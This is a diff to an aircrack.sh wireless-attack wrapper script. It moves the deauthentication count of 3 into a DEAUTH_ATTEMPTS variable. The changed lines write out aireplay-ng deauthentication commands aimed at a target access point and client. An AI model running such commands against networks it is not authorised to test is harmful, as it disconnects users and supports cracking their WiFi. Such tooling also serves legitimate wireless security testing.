@@ -14,6 +14,7 @@
 #  Run with `./aircrack.sh` *NOT* `sh aircrack.sh`   #
 # 						     #	
 ######################################################
+DEAUTH_ATTEMPTS="3"
 
 if ! [ $(id -u) = 0 ]; then
    echo "Run as root"
@@ -82,8 +83,8 @@ do
 	fi
 	if [ -n "$CLIENT_MAC" ]
 	then
-		xterm -geometry 90x6+850+620 -e "aireplay-ng --ignore-negative-one -0 3 -a $BSSID -c $CLIENT_MAC $INTERFACE" 2> /dev/null
+		xterm -geometry 90x6+850+620 -e "aireplay-ng --ignore-negative-one -0 $DEAUTH_ATTEMPTS -a $BSSID -c $CLIENT_MAC $INTERFACE" 2> /dev/null
 	else
-		xterm -geometry 90x6+850+620 -e "aireplay-ng --ignore-negative-one -0 3 -a $BSSID $INTERFACE" 2> /dev/null
+		xterm -geometry 90x6+850+620 -e "aireplay-ng --ignore-negative-one -0 $DEAUTH_ATTEMPTS -a $BSSID $INTERFACE" 2> /dev/null
 	fi
 done
